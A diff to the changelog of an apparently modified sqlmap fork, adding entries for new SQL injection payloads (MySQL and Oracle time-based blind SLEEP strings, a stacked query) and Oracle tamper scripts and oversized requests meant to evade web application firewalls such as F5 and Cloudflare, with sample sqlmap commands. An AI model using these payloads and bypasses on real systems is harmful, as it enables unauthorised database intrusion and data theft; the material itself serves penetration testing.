@@ -6,6 +6,94 @@
 
 ---
 
+## [2.6.0] - 2026-02-24 - CyberVaca mod 1.10.2.17#dev
+
+### Version Branding
+
+- **CyberVaca mod. 1.10.2.17#dev** - Version string now displays in banner, `--version` and User-Agent
+
+### Ghauri Payloads for All DBMS
+
+**time_blind.xml - MySQL:**
+- `(SELECT(0)FROM(SELECT(SLEEP([SLEEPTIME])))v)` - Pre-WHERE/string context, WAF bypass
+- `if(now()=sysdate(),SLEEP([SLEEPTIME]),0)` - Alternate when IF/SLEEP filtered
+- `(SELECT CASE WHEN(1=1) THEN SLEEP([SLEEPTIME]) ELSE 0 END)` - CASE variant
+
+**time_blind.xml - Oracle:**
+- `DBMS_LOCK.SLEEP([SLEEPTIME])` - String context (Ghauri style)
+- `USER_LOCK.SLEEP([SLEEPTIME])` - Alternative when DBMS_LOCK unavailable
+
+**stacked_queries.xml - MySQL:**
+- `;(SELECT(1)FROM(SELECT(SLEEP([SLEEPTIME])))a)` - Ghauri stacked query style
+
+### Technical
+
+- PostgreSQL, MSSQL: Existing payloads cover Ghauri techniques
+- Reference: https://github.com/r0oth3x49/ghauri
+
+---
+
+## [2.5.0] - 2026-02-25 - Oversizedrequest Configurable Size
+
+### Enhancement
+
+**oversizedrequest.py** - Configurable oversize parameter
+
+- New option `--tamper-data=oversizedrequest.size=20M` to pass tamper parameters
+- Fallback: `SQLMAP_OVERSIZEDREQUEST_SIZE` environment variable
+- Supports suffixes: K (1024), M (1024²), G (1024³), case-insensitive
+- Default: 8200 bytes. Max: 64MB
+- Invalid values fall back to default with a warning
+
+**Usage:**
+```bash
+# Default 8200 bytes (Cloudflare, AWS, Google Cloud Armor)
+python sqlmap.py -r request.req --tamper=oversizedrequest
+
+# Custom size via --tamper-data (preferred)
+python sqlmap.py -r request.req --tamper=oversizedrequest --tamper-data=oversizedrequest.size=20M
+
+# Or via environment variable
+SQLMAP_OVERSIZEDREQUEST_SIZE=128K python sqlmap.py -r request.req --tamper=oversizedrequest
+```
+
+---
+
+## [2.4.0] - 2026-02-25 - Oracle Ghauri Techniques
+
+### New Tamper Scripts (based on Ghauri)
+
+**oraclechr.py** - Converts string literals to CHR() concatenation
+- `'test'` → `CHR(116)||CHR(101)||CHR(115)||CHR(116)`
+- Effective against signature-based WAFs
+
+**oraclectxsys.py** - Uses CTXSYS.DRITHSX.SN for boolean-based bypass
+- Converts `THEN 1 ELSE 0 END` to `THEN NULL ELSE CTXSYS.DRITHSX.SN(1,0568) END`
+- Uses Oracle error for true/false differentiation
+
+**oraclebetween.py** - Oracle-specific BETWEEN for extraction
+- Replaces `)>N` with `) NOT BETWEEN 0 AND N` for DUAL/SUBSTRC payloads
+- When WAF blocks greater-than operator
+
+### New Payloads
+
+**time_blind.xml** - USER_LOCK.SLEEP for Oracle
+- Alternative when DBMS_LOCK.SLEEP not available
+- Ghauri technique for Oracle E-Business Suite
+
+### WAF Mapping
+
+- F5: Added oraclebetween to default tampers for Oracle+F5 scenarios
+
+**Usage (Oracle + F5 WAF):**
+```bash
+sqlmap -r request.req --dbms=oracle --tamper=oraclebetween,oraclechr,oraclectxsys,between --dbs
+```
+
+**Reference:** https://github.com/r0oth3x49/ghauri
+
+---
+
 ## [2.2.0] - 2026-02-24 - Oversized Request Fix
 
 ### Bug Fix
